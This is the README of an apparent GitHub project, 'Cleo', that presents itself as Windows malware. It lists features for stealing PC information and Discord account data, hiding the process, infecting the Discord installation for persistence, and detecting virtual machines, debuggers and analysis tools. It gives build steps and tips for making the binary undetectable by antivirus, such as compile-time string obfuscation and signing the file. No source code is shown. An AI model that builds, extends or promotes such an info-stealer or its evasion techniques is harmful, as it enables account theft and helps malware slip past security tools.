# Cleo
<img src="https://img.shields.io/github/stars/Passive/Cleo?style=plastic"> <img src="https://img.shields.io/github/forks/Passive/Cleo?style=plastic">                       
Malware written to target windows machines, easily detectable
if you have a good anti-virus however tries to become UD on scantime.
                                                                                                         
If you encounter an error or issue, make an issue [here](https://github.com/Passive/Cleo/issues).                                                                   
Lastly, if code here is used for something else, **give credit where credit is due**.

# Features
_**Note: PERSISTENCE IS NOT INCLUDED WITHIN THE CURRENT BUILD**_

Feature  | Description
-------- | -----------
Silence | Process is hidden when ran.
Info Grab | Grabs ALL important PC information & discord account information.
Persistence | Runs at startup & infects discord installation.
Anti VM | Checks system manufacturers & names that are virtual machines (exits if detected)
Anti Debug | Uses methods to check if program is being debugged. (exits if detected).
Anti Analysis | Checks if an analyzing process is open. (exits if detected).
Obfuscation | Automatic compile-time string obfuscation.

# Build

Steps for building/compiling Cleo yourself.

### Dependencies
All dependencies listed can be installed automatically by running the powershell script [here](https://github.com/Passive/Cleo/blob/main/install_dependencies.ps1).
+ [LibCurl](https://curl.se/libcurl/c/) - Used by CPR behind the scenes.
+ [CPR](https://github.com/whoshuu/cpr) - Simply a wrapper over LibCurl, used for all HTTP requests in Cleo.
+ [JSON Parser](https://github.com/nlohmann/json) - For parsing discord account information.
+ [AyObfuscate (xorstr)](https://github.com/adamyaxley/Obfuscate) - Used for hiding important strings.

After installing dependencies, make sure it's all statically linked.                                                                                            
Then, make sure you compile on Release Mode. (x86)                                                                                                              
Make an issue [here](https://github.com/dehoisted/Cleo) if you get any compilation errors.

### Making it FUD on scantime
Make sure all strings related to Discord are obfuscated on compile-time.                                                                           
**- Sign your file.**

Make sure not to build with debug information.

# Credits                                                                                                                                               
+ [Passive](https://github.com/Passive)                                                 
+ [Dehoisted](https://github.com/dehoisted) - Wrote previous versions of Cleo and the anti-debug + Discord modules                                                               
